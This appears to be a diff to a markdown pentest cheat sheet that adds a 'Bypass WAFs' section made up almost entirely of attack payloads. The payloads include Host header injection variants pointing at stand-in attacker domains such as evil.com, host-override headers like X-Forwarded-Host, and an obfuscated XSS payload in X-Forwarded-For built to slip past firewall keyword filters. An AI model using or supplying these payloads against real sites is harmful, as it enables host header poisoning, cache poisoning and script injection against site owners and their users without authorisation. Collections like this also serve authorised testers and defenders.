@@ -102,3 +102,41 @@ Access-Control-Allow-Origin: https://example.com
 Access-Control-Allow-Credentials: true
 ```
 
+## Bypass WAFs
+
+```http
+**There are some other ways to bypass Host Header**
+
+Host: google.com:evil.com  # dangling markup injecton  
+Host: a.example.com.evil.com  
+Host: evilnormal.google.com  
+Host: normal-website.com.evil-user.net  
+Host: a.example.com_.b.example.com  
+Host: a.example.com}.b.evil.com  
+Host: a.example.com@b.evil.com  
+X-Host: evil.com  
+Host: a.example.com#b.evil.com  
+Host: hacked-subdomain.google.com  
+  
+# Supply an absolute URL  
+ Host: bad-stuff-here  
+   
+ # Add line wrapping (use space character)  
+     Host: bad-stuff-here  
+ Host: vulnerable-website.com  
+   
+ # Inject host override headers  
+ Host: vulnerable-website.com  
+ X-Forwarded-Host: bad-stuff-here  
+  
+Other Headers:  
+     X-Host: www.evil.com  
+     X-Forwarded-Server: www.evil.com  
+     X-HTTP-Host-Override: www.evil.com  
+     Forwarded  
+  
+NOTE: Trick the WAF, First header is blocked but other not  
+ *  X-Forwarded-For: xss   
+ -> X-Forwarded-For: xss><svg/onload=globalThis[`al`+/ert/.source]`1`//   
+ -> X-Forwarded-For: >
+```
